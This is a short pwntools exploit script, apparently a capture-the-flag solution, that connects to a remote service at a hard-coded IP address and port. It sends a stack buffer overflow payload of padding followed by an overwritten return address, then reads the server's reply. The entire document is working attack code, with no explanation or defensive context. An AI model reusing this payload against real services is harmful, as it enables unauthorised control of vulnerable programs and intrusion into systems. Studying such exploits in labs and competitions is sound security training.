from pwn import *

r = remote('115.29.37.180', 10086)

payload = 'j' * (0x10 + 4) + p32(0x400674)
r.sendline(payload)
r.recvuntil('0x')
